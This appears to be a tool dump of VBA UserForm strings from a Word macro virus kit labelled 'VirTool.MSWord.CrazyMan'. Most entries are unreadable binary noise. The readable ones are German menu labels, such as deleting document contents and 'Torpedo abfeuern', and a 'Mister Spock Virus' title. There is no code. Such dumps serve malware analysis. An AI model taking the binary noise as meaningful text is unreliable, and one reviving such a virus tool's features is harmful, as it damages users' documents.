VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;���p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������?���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i04/i68/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   Textbox anzeigen ...  
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Internetseite �ffnen ...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   Text ersetzen ...       
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Torpedo abfeuern ...w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Torpedo abfeuern ...w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Torpedo abfeuern ...w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hilfe ...UV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hilfe ...UV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hilfe ...UV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Torpedo abfeuern ...w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hilfe ...UV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� Dokumenteninhalt l�schen ... 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i05/i55/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������p�����������������������������������������������������������������������������������������������p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����|�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����|������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mister Spock Virus - Version 2.x.x B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i01/i115/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(:3=<9387@H\N@DWE78PmQW_bghg>Mqypdx\egc��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/cB8Bcccccccccccccccccccccccccccccccccccccccccccccccccc��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#2aq���3R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%r���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Aaq"2B3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(��
(�oʀ
*a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_�;�Q_p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N܇־�-�+���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\t�¸ ��0jғ��

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
(��
(��
�[JmM�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3Z�oO]3�V��q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F��ϋKɨ��~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�fLx�����V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�޵)(��b�؇N�_P.#�%��͹�
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�؇���H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#gu"�[k���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�����E��E�{)3~,��ZN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����?���k�~{��$��gf�S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�G,�b�,pjы�쩄����r(~Ԧ]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�?z�v��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o3[٪�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��|�3q��\�5̌<��>����lT�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.CrazyMan' - OLE stream: 'Macros/MainUserForm/i13/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)J�*�w
-------------------------------------------------------------------------------
